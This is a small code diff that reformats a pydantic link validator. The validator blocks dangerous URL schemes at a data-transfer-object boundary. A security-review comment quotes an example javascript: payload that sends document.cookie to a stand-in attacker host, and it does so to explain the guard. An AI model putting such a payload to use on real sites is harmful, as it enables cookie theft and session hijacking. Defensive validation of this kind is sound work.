@@ -5,7 +5,6 @@ from datetime import datetime
 
 from pydantic import BaseModel, Field, field_validator
 
-
 # HIGH-1 (sprint-4 security review): block dangerous URL schemes at the
 # DTO boundary. Without this guard, an admin could embed
 # `javascript:fetch('https://attacker/?'+document.cookie)` and any
@@ -20,9 +19,7 @@ def _validate_link(v: str | None) -> str | None:
     if v is None or v == "":
         return None
     if not any(v.startswith(p) for p in _ALLOWED_LINK_PREFIXES):
-        raise ValueError(
-            "link must be a relative path (/...) or an http/https URL"
-        )
+        raise ValueError("link must be a relative path (/...) or an http/https URL")
     return v
 
 
